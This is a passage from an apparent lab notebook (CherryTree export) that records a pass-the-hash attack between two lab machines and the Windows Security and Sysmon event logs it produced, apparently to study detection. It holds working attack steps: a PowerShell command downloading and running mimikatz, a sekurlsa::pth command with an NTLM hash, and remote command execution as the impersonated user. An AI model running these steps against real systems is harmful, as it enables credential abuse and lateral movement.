      &lt;Data Name=&quot;Hashes&quot;&gt;MD5=AB4AB98654635CABADB5F1A60BDA1C05,SHA256=5FCCFF57D379CDC4CF6196FEF554CEF753B4C76DC315F371F90AEBF07B6A18C3&lt;/Data&gt; 
      &lt;Data Name=&quot;ParentProcessGuid&quot;&gt;{00000000-0000-0000-0000-000000000000}&lt;/Data&gt; 
      &lt;Data Name=&quot;ParentProcessId&quot;&gt;840&lt;/Data&gt; 
      &lt;Data Name=&quot;ParentImage&quot;&gt;?&lt;/Data&gt; 
      &lt;Data Name=&quot;ParentCommandLine&quot;&gt;?&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="3.2. 11 - File created (rule: FileCreate)" prog_lang="xml" readonly="True" tags="" ts_creation="1562069901.03" ts_lastsave="1562069907.53" unique_id="135"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-Sysmon&quot; Guid=&quot;{5770385f-c22a-43e0-bf4c-06f5698ffbd9}&quot; /&gt; 
      &lt;EventID&gt;11&lt;/EventID&gt; 
      &lt;Version&gt;2&lt;/Version&gt; 
      &lt;Level&gt;4&lt;/Level&gt; 
      &lt;Task&gt;11&lt;/Task&gt; 
      &lt;Opcode&gt;0&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-02T12:13:30.606913700Z&quot; /&gt; 
      &lt;EventRecordID&gt;2620&lt;/EventRecordID&gt; 
      &lt;Correlation /&gt; 
      &lt;Execution ProcessID=&quot;3244&quot; ThreadID=&quot;4020&quot; /&gt; 
      &lt;Channel&gt;Microsoft-Windows-Sysmon/Operational&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10&lt;/Computer&gt; 
      &lt;Security UserID=&quot;S-1-5-18&quot; /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;RuleName&quot; /&gt; 
      &lt;Data Name=&quot;UtcTime&quot;&gt;2019-07-02 12:13:30.605&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessGuid&quot;&gt;{747f3d96-4a6a-5d1b-0000-00105be63401}&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessId&quot;&gt;6308&lt;/Data&gt; 
      &lt;Data Name=&quot;Image&quot;&gt;C:\Windows\system32\wsmprovhost.exe&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetFilename&quot;&gt;C:\Users\IEUser\AppData\Local\Temp\__PSScriptPolicyTest_zb0ufpbg.p4o.ps1&lt;/Data&gt; 
      &lt;Data Name=&quot;CreationUtcTime&quot;&gt;2019-07-02 12:13:30.605&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node></node></node><node custom_icon_id="0" foreground="" is_bold="False" name="4. Authenticate using mimikatz.exe" prog_lang="custom-colors" readonly="True" tags="" ts_creation="1562070826.07" ts_lastsave="1562120537.19" unique_id="136"><rich_text scale="h1" underline="single" weight="heavy">Local Machine (KALI-WINDOWS):</rich_text><rich_text>

</rich_text><rich_text scale="h2">1. Download and run </rich_text><rich_text scale="h2" underline="single" weight="heavy">mimikatz.exe</rich_text><rich_text scale="h2">:</rich_text><rich_text>

    </rich_text><rich_text justification="left"></rich_text><rich_text>
    
    </rich_text><rich_text justification="left"></rich_text><rich_text>
    
</rich_text><rich_text scale="h2">2. Execute </rich_text><rich_text scale="h2" underline="single" weight="heavy">Pass-the-Hash</rich_text><rich_text scale="h2"> inside </rich_text><rich_text scale="h2" weight="heavy">mimikatz.exe</rich_text><rich_text scale="h2">:
</rich_text><rich_text> </rich_text><rich_text scale="h2">
   </rich_text><rich_text justification="left"></rich_text><rich_text> 
   
    </rich_text><rich_text justification="left"></rich_text><rich_text>
    
</rich_text><rich_text scale="h2">3. A </rich_text><rich_text scale="h2" underline="single" weight="heavy">PowerShell Terminal</rich_text><rich_text scale="h2"> will pop-up:</rich_text><rich_text>
   
    </rich_text><rich_text justification="left"></rich_text><rich_text>

</rich_text><rich_text scale="h3">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</rich_text><rich_text>

</rich_text><rich_text scale="h1" weight="heavy">NOTES:</rich_text><rich_text>
</rich_text><rich_text scale="h2">• An </rich_text><rich_text scale="h2" underline="single" weight="heavy">NTLM hash</rich_text><rich_text scale="h2"> was used to authenticate the user account </rich_text><rich_text scale="h2" underline="single" weight="heavy">GodConcy</rich_text><rich_text scale="h2">
• GodConcy, as a low privilege user, </rich_text><rich_text scale="h2" underline="single" weight="heavy">did not generate</rich_text><rich_text scale="h2"> PowerShell Logs </rich_text><rich_text scale="sub" weight="heavy">(Reference)</rich_text><rich_text>

</rich_text><rich_text scale="h3">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</rich_text><rich_text>

</rich_text><rich_text scale="h1" weight="heavy">LOGS GENERATED:</rich_text><rich_text>
</rich_text><rich_text scale="h2">• LogName: Security</rich_text><rich_text>:

</rich_text><rich_text scale="h3">    3.1. </rich_text><rich_text link="node 138" scale="h3">4624 - Logon (Success)</rich_text><rich_text scale="h3">
    3.2. </rich_text><rich_text link="node 139" scale="h3">4688 - Process Creation (Success)</rich_text><rich_text scale="h3">
    3.3. </rich_text><rich_text link="node 140" scale="h3">4688 - Process Creation (Success)</rich_text><rich_text scale="h3">
    3.4. </rich_text><rich_text link="node 141" scale="h3">4624 - Logon (Success)</rich_text><rich_text scale="h3">
    3.5. </rich_text><rich_text link="node 142" scale="h3">4688 - Process Creation (Success)</rich_text><rich_text scale="h3">
    3.6. </rich_text><rich_text link="node 143" scale="h3">4688 - Process Creation (Success)</rich_text><rich_text scale="h3">
    3.7. </rich_text><rich_text link="node 144" scale="h3">4624 - Logon (Success)</rich_text><rich_text>
    
</rich_text><rich_text scale="h2">• Sysmon Logs</rich_text><rich_text>

</rich_text><rich_text scale="h3">    3.1. </rich_text><rich_text link="node 147" scale="h3">1 - Process Create (rule: ProcessCreate)</rich_text><rich_text scale="h3">
    3.2. </rich_text><rich_text link="node 148" scale="h3">11 - File created (rule: FileCreate)</rich_text><rich_text scale="h3">
    3.3. </rich_text><rich_text link="node 146" scale="h3">1 - Process Create (rule: ProcessCreate)</rich_text><rich_text>

















    </rich_text><codebox char_offset="70" frame_height="160" frame_width="91" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="powershell" width_in_pixels="False">Invoke-WebRequest -uri https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20190512/mimikatz_trunk.zip -outfile .\mimikatz.zip

Expand-Archive .\mimikatz.zip

cd mimikatz/x64

.\mimikatz.exe</codebox><codebox char_offset="81" frame_height="190" frame_width="91" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="powershell" width_in_pixels="False">
  .#####.   mimikatz 2.2.0 (x64) #18362 May 13 2019 01:35:04
 .## ^ ##.  &quot;A La Vie, A L'Amour&quot; - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz #</codebox><codebox char_offset="139" frame_height="40" frame_width="91" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="powershell" width_in_pixels="False">sekurlsa::pth /user:GodConcy /domain:MSEDGEWIN10 /ntlm:52c09b0dbe2896740a5ca9c2455c57f4 /run:powershell.exe</codebox><codebox char_offset="150" frame_height="370" frame_width="91" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="powershell" width_in_pixels="False">user    : GodConcy
domain  : MSEDGEWIN10
program : powershell.exe
impers. : no
NTLM    : 52c09b0dbe2896740a5ca9c2455c57f4
  |  PID  8376
  |  TID  5044
  |  LSA Process was already R/W
  |  LUID 0 ; 101515340 (00000000:060d004c)
  \_ msv1_0   - data copy @ 0000020D6C4F2E80 : OK !
  \_ kerberos - data copy @ 0000020D6C4C6338
   \_ aes256_hmac       -&gt; null
   \_ aes128_hmac       -&gt; null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 0000020D6C2C6418 (32) -&gt; null</codebox><codebox char_offset="203" frame_height="100" frame_width="91" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="powershell" width_in_pixels="False">whoami
# kali-windows\jebidiah

Invoke-Command -ComputerName 192.168.56.101 -scriptblock { whoami }
# msedgewin10\godconcy</codebox><node custom_icon_id="0" foreground="" is_bold="False" name="LogName: Security" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1562075449.69" ts_lastsave="1562075465.11" unique_id="137"><rich_text></rich_text><node custom_icon_id="0" foreground="" is_bold="False" name="3.1. 4624 - Logon (Success)" prog_lang="xml" readonly="True" tags="" ts_creation="1562075465.12" ts_lastsave="1562075954.71" unique_id="138"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-Security-Auditing&quot; Guid=&quot;{54849625-5478-4994-a5ba-3e3b0328c30d}&quot; /&gt; 
      &lt;EventID&gt;4624&lt;/EventID&gt; 
      &lt;Version&gt;2&lt;/Version&gt; 
      &lt;Level&gt;0&lt;/Level&gt; 
      &lt;Task&gt;12544&lt;/Task&gt; 
      &lt;Opcode&gt;0&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-02T13:58:39.365991000Z&quot; /&gt; 
      &lt;EventRecordID&gt;487127&lt;/EventRecordID&gt; 
      &lt;Correlation ActivityID=&quot;{65f33aba-315b-0005-f63a-f3655b31d501}&quot; /&gt; 
      &lt;Execution ProcessID=&quot;692&quot; ThreadID=&quot;4912&quot; /&gt; 
      &lt;Channel&gt;Security&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10&lt;/Computer&gt; 
      &lt;Security /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;SubjectUserSid&quot;&gt;S-1-0-0&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectUserName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectDomainName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectLogonId&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetUserSid&quot;&gt;S-1-5-21-3461203602-4096304019-2269080069-1010&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetUserName&quot;&gt;GodConcy&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetDomainName&quot;&gt;MSEDGEWIN10&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetLogonId&quot;&gt;0x1e4912&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonType&quot;&gt;3&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonProcessName&quot;&gt;NtLmSsp&lt;/Data&gt; 
      &lt;Data Name=&quot;AuthenticationPackageName&quot;&gt;NTLM&lt;/Data&gt; 
      &lt;Data Name=&quot;WorkstationName&quot;&gt;KALI-WINDOWS&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonGuid&quot;&gt;{00000000-0000-0000-0000-000000000000}&lt;/Data&gt; 
      &lt;Data Name=&quot;TransmittedServices&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;LmPackageName&quot;&gt;NTLM V2&lt;/Data&gt; 
      &lt;Data Name=&quot;KeyLength&quot;&gt;128&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessId&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;IpAddress&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;IpPort&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;ImpersonationLevel&quot;&gt;%%1833&lt;/Data&gt; 
      &lt;Data Name=&quot;RestrictedAdminMode&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetOutboundUserName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetOutboundDomainName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;VirtualAccount&quot;&gt;%%1843&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetLinkedLogonId&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;ElevatedToken&quot;&gt;%%1843&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="3.2. 4688 - Process Creation (Success)" prog_lang="xml" readonly="True" tags="" ts_creation="1562075958.46" ts_lastsave="1562075991.39" unique_id="139"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-Security-Auditing&quot; Guid=&quot;{54849625-5478-4994-a5ba-3e3b0328c30d}&quot; /&gt; 
      &lt;EventID&gt;4688&lt;/EventID&gt; 
      &lt;Version&gt;2&lt;/Version&gt; 
      &lt;Level&gt;0&lt;/Level&gt; 
      &lt;Task&gt;13312&lt;/Task&gt; 
      &lt;Opcode&gt;0&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-02T13:58:39.607591100Z&quot; /&gt; 
      &lt;EventRecordID&gt;487135&lt;/EventRecordID&gt; 
      &lt;Correlation /&gt; 
      &lt;Execution ProcessID=&quot;4&quot; ThreadID=&quot;4280&quot; /&gt; 
      &lt;Channel&gt;Security&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10&lt;/Computer&gt; 
      &lt;Security /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;SubjectUserSid&quot;&gt;S-1-5-18&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectUserName&quot;&gt;MSEDGEWIN10$&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectDomainName&quot;&gt;WORKGROUP&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectLogonId&quot;&gt;0x3e7&lt;/Data&gt; 
      &lt;Data Name=&quot;NewProcessId&quot;&gt;0x4dc&lt;/Data&gt; 
      &lt;Data Name=&quot;NewProcessName&quot;&gt;C:\Windows\System32\dllhost.exe&lt;/Data&gt; 
      &lt;Data Name=&quot;TokenElevationType&quot;&gt;%%1936&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessId&quot;&gt;0x344&lt;/Data&gt; 
      &lt;Data Name=&quot;CommandLine&quot;&gt;C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetUserSid&quot;&gt;S-1-0-0&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetUserName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetDomainName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetLogonId&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;ParentProcessName&quot;&gt;C:\Windows\System32\svchost.exe&lt;/Data&gt; 
      &lt;Data Name=&quot;MandatoryLabel&quot;&gt;S-1-16-16384&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="3.3. 4688 - Process Creation (Success)" prog_lang="xml" readonly="True" tags="" ts_creation="1562076196.95" ts_lastsave="1562076202.8" unique_id="140"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-Security-Auditing&quot; Guid=&quot;{54849625-5478-4994-a5ba-3e3b0328c30d}&quot; /&gt; 
      &lt;EventID&gt;4688&lt;/EventID&gt; 
      &lt;Version&gt;2&lt;/Version&gt; 
      &lt;Level&gt;0&lt;/Level&gt; 
      &lt;Task&gt;13312&lt;/Task&gt; 
      &lt;Opcode&gt;0&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-02T13:58:39.624727300Z&quot; /&gt; 
      &lt;EventRecordID&gt;487137&lt;/EventRecordID&gt; 
      &lt;Correlation /&gt; 
      &lt;Execution ProcessID=&quot;4&quot; ThreadID=&quot;4280&quot; /&gt; 
      &lt;Channel&gt;Security&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10&lt;/Computer&gt; 
      &lt;Security /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;SubjectUserSid&quot;&gt;S-1-5-18&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectUserName&quot;&gt;MSEDGEWIN10$&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectDomainName&quot;&gt;WORKGROUP&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectLogonId&quot;&gt;0x3e7&lt;/Data&gt; 
      &lt;Data Name=&quot;NewProcessId&quot;&gt;0x1510&lt;/Data&gt; 
      &lt;Data Name=&quot;NewProcessName&quot;&gt;C:\Windows\System32\wsmprovhost.exe&lt;/Data&gt; 
      &lt;Data Name=&quot;TokenElevationType&quot;&gt;%%1936&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessId&quot;&gt;0x344&lt;/Data&gt; 
      &lt;Data Name=&quot;CommandLine&quot;&gt;C:\Windows\system32\wsmprovhost.exe -Embedding&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetUserSid&quot;&gt;S-1-0-0&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetUserName&quot;&gt;GodConcy&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetDomainName&quot;&gt;MSEDGEWIN10&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetLogonId&quot;&gt;0x1e4912&lt;/Data&gt; 
      &lt;Data Name=&quot;ParentProcessName&quot;&gt;C:\Windows\System32\svchost.exe&lt;/Data&gt; 
      &lt;Data Name=&quot;MandatoryLabel&quot;&gt;S-1-16-8192&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="3.4. 4624 - Logon (Success)" prog_lang="xml" readonly="True" tags="" ts_creation="1562076229.52" ts_lastsave="1562076238.75" unique_id="141"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-Security-Auditing&quot; Guid=&quot;{54849625-5478-4994-a5ba-3e3b0328c30d}&quot; /&gt; 
      &lt;EventID&gt;4624&lt;/EventID&gt; 
      &lt;Version&gt;2&lt;/Version&gt; 
      &lt;Level&gt;0&lt;/Level&gt; 
      &lt;Task&gt;12544&lt;/Task&gt; 
      &lt;Opcode&gt;0&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-02T13:58:39.685557700Z&quot; /&gt; 
      &lt;EventRecordID&gt;487144&lt;/EventRecordID&gt; 
      &lt;Correlation ActivityID=&quot;{65f33aba-315b-0005-f63a-f3655b31d501}&quot; /&gt; 
      &lt;Execution ProcessID=&quot;692&quot; ThreadID=&quot;4912&quot; /&gt; 
      &lt;Channel&gt;Security&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10&lt;/Computer&gt; 
      &lt;Security /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;SubjectUserSid&quot;&gt;S-1-0-0&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectUserName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectDomainName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectLogonId&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetUserSid&quot;&gt;S-1-5-21-3461203602-4096304019-2269080069-1010&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetUserName&quot;&gt;GodConcy&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetDomainName&quot;&gt;MSEDGEWIN10&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetLogonId&quot;&gt;0x1e51dd&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonType&quot;&gt;3&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonProcessName&quot;&gt;NtLmSsp&lt;/Data&gt; 
      &lt;Data Name=&quot;AuthenticationPackageName&quot;&gt;NTLM&lt;/Data&gt; 
      &lt;Data Name=&quot;WorkstationName&quot;&gt;KALI-WINDOWS&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonGuid&quot;&gt;{00000000-0000-0000-0000-000000000000}&lt;/Data&gt; 
      &lt;Data Name=&quot;TransmittedServices&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;LmPackageName&quot;&gt;NTLM V2&lt;/Data&gt; 
      &lt;Data Name=&quot;KeyLength&quot;&gt;128&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessId&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;IpAddress&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;IpPort&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;ImpersonationLevel&quot;&gt;%%1833&lt;/Data&gt; 
      &lt;Data Name=&quot;RestrictedAdminMode&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetOutboundUserName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetOutboundDomainName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;VirtualAccount&quot;&gt;%%1843&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetLinkedLogonId&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;ElevatedToken&quot;&gt;%%1843&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="3.5. 4688 - Process Creation (Success)" prog_lang="xml" readonly="True" tags="" ts_creation="1562076300.43" ts_lastsave="1562076306.97" unique_id="142"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-Security-Auditing&quot; Guid=&quot;{54849625-5478-4994-a5ba-3e3b0328c30d}&quot; /&gt; 
      &lt;EventID&gt;4688&lt;/EventID&gt; 
      &lt;Version&gt;2&lt;/Version&gt; 
      &lt;Level&gt;0&lt;/Level&gt; 
      &lt;Task&gt;13312&lt;/Task&gt; 
      &lt;Opcode&gt;0&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-02T13:58:39.871462700Z&quot; /&gt; 
      &lt;EventRecordID&gt;487153&lt;/EventRecordID&gt; 
      &lt;Correlation /&gt; 
      &lt;Execution ProcessID=&quot;4&quot; ThreadID=&quot;4280&quot; /&gt; 
      &lt;Channel&gt;Security&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10&lt;/Computer&gt; 
      &lt;Security /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;SubjectUserSid&quot;&gt;S-1-5-21-3461203602-4096304019-2269080069-1010&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectUserName&quot;&gt;GodConcy&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectDomainName&quot;&gt;MSEDGEWIN10&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectLogonId&quot;&gt;0x1e4912&lt;/Data&gt; 
      &lt;Data Name=&quot;NewProcessId&quot;&gt;0x12b0&lt;/Data&gt; 
      &lt;Data Name=&quot;NewProcessName&quot;&gt;C:\Windows\System32\whoami.exe&lt;/Data&gt; 
      &lt;Data Name=&quot;TokenElevationType&quot;&gt;%%1936&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessId&quot;&gt;0x1510&lt;/Data&gt; 
      &lt;Data Name=&quot;CommandLine&quot;&gt;&quot;C:\Windows\system32\whoami.exe&quot;&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetUserSid&quot;&gt;S-1-0-0&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetUserName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetDomainName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetLogonId&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;ParentProcessName&quot;&gt;C:\Windows\System32\wsmprovhost.exe&lt;/Data&gt; 
      &lt;Data Name=&quot;MandatoryLabel&quot;&gt;S-1-16-8192&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;